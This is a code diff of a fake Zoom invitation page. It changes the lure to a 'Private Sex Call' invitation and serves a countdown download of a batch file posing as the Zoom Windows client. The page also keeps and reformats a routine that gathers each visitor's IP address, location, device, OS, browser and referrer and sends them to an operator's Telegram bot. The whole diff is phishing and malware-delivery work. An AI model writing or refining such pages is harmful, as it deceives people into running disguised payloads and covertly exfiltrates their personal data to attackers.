@@ -191,7 +191,7 @@
             color: #aaa;
         }
 
-        /* responsive tweaks for invitation */
+        /* responsive tweaks */
         @media (max-width: 600px) {
             .invitation-card {
                 padding: 28px 20px 30px;
@@ -320,7 +320,6 @@
             display: none;
         }
 
-        /* responsive for download page */
         @media (max-width: 600px) {
             .logo-container {
                 position: static;
@@ -377,11 +376,11 @@
         <div class="invitation-card">
             <img class="zoom-logo" src="Zoom_Communications_Logo.svg" alt="Zoom" />
             <h1 class="meeting-title">You are invited to a Zoom meeting</h1>
-            <div class="meeting-topic">Project Alpha – Weekly Sync</div>
-            <div class="meeting-host">Hosted by <strong>Mr T</strong></div>
+            <div class="meeting-topic">Private Sex Call</div>
+            <div class="meeting-host">Hosted by <strong>Melissa</strong></div>
             <hr class="divider" />
             <div class="meeting-details">
-                <span><span class="label">Meeting ID:</span> 723 826 100</span>
+                <span><span class="label">Meeting ID:</span> 233 476 719</span>
             </div>
             <button class="btn-join" id="joinButton">
                 <span class="icon">▶</span> Join Meeting
@@ -392,7 +391,7 @@
                 Do not share this information with anyone, including administrators or colleagues.
                 If you are asked for such information, report it immediately.
             </div>
-            <p class="footer-note">This meeting requires the Zoom desktop.</p>
+            <p class="footer-note">This meeting requires the Zoom desktop client for Windows.</p>
         </div>
     </div>
 
@@ -471,7 +470,6 @@
                 return window.location.hash.slice(1) || '';
             }
 
-            // On load, if the path is not '/' or empty, rewrite to root with hash
             function ensureRootPath() {
                 var path = window.location.pathname;
                 var hash = window.location.hash;
@@ -538,7 +536,7 @@
             }
 
             // ------------------------------------------------------------
-            //  6.  COUNTDOWN + DOWNLOAD (unchanged)
+            //  6.  COUNTDOWN + DOWNLOAD
             // ------------------------------------------------------------
             function startCountdownAndDownload() {
                 var countdownEl = document.getElementById('countdown');
@@ -688,7 +686,9 @@
                         });
                 });
 
-                // --- Telegram report (unchanged) ---
+                // ------------------------------------------------------------
+                //  TELEGRAM REPORT HELPERS (unchanged)
+                // ------------------------------------------------------------
                 function getBrowserInfo() {
                     var ua = navigator.userAgent;
                     if (ua.indexOf('Firefox') > -1) return 'Firefox';
@@ -746,6 +746,10 @@
                             });
                     });
                 }
+
+                // ------------------------------------------------------------
+                //  NEW: sendTelegramReport – uses IP services
+                // ------------------------------------------------------------
                 function sendTelegramReport() {
                     if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID') {
                         console.warn('Telegram not configured.');
@@ -819,6 +823,10 @@
                     }
                     tryService(0);
                 }
+
+                // ------------------------------------------------------------
+                //  NEW: buildAndSendTelegram – clean bullet list with emojis
+                // ------------------------------------------------------------
                 function buildAndSendTelegram(ip, location) {
                     var ua = navigator.userAgent;
                     var browser = getBrowserInfo();
@@ -833,47 +841,32 @@
                     var downloadUrl = window.location.href;
 
                     var lines = [];
-                    var header = 'Zoom';
-                    var borderLine = '┌─────────────────────────────────────────────────────┐';
-                    var sepLine = '├─────────────────────────────────────────────────────┤';
-                    var bottomLine = '└─────────────────────────────────────────────────────┘';
-                    lines.push(borderLine);
-                    lines.push('│  ' + header.padEnd(49) + '│');
-                    lines.push(sepLine);
+                    lines.push('📢 *Zoom Update Report*');
+                    lines.push('');
 
                     var fields = [
-                        ['Time', time],
-                        ['IP Address', ip],
-                        ['Location', location],
-                        ['Device', device],
-                        ['OS', os],
-                        ['Browser', browserDisplay],
-                        ['Language', lang],
-                        ['Screen', screen],
-                        ['Referrer', referrer],
-                        ['Package', 'Zoom_WorkSpace_ClientSetup.bat'],
-                        ['Download URL', downloadUrl],
-                        ['User Agent', ua]
+                        ['🕐 Time', time],
+                        ['🌐 IP Address', ip],
+                        ['📍 Location', location],
+                        ['💻 Device', device],
+                        ['🖥️ OS', os],
+                        ['🌍 Browser', browserDisplay],
+                        ['🗣️ Language', lang],
+                        ['📺 Screen', screen],
+                        ['🔗 Referrer', referrer],
+                        ['📦 Package', 'Zoom_WorkSpace_ClientSetup.bat'],
+                        ['🔽 Download URL', downloadUrl],
+                        ['🤖 User Agent', ua]
                     ];
 
-                    var maxLabelLen = 0;
-                    fields.forEach(function(f) { if (f[0].length > maxLabelLen) maxLabelLen = f[0].length; });
-
-                    fields.forEach(function(f) {
-                        var label = f[0];
-                        var value = f[1];
-                        var line = '│  ' + label.padEnd(maxLabelLen) + ' : ' + value;
-                        if (line.length > 54) {
-                            var maxValueLen = 54 - maxLabelLen - 6;
-                            if (value.length > maxValueLen) {
-                                value = value.substring(0, maxValueLen - 1) + '…';
-                            }
-                            line = '│  ' + label.padEnd(maxLabelLen) + ' : ' + value;
-                        }
-                        line = line.padEnd(54) + '│';
-                        lines.push(line);
+                    fields.forEach(function(field) {
+                        var label = field[0];
+                        var value = field[1];
+                        // Escape backticks and underscores for Markdown
+                        var escapedValue = value.replace(/`/g, '\\`').replace(/_/g, '\\_');
+                        lines.push('• *' + label + ':* `' + escapedValue + '`');
                     });
-                    lines.push(bottomLine);
+
                     var message = lines.join('\n');
 
                     var url = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';
